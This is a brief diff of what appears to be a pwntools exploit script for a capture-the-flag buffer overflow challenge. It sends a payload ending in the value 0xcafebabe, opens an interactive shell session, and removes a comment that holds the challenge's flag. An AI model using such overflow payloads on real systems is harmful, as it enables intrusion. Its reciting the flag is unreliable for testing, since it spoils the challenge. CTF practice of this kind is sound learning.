@@ -10,5 +10,3 @@ payload += p32(0xcafebabe)
 r.sendline(payload)
 
 r.interactive()
-
-# flag = "daddy, I just pwned a buFFer :)"
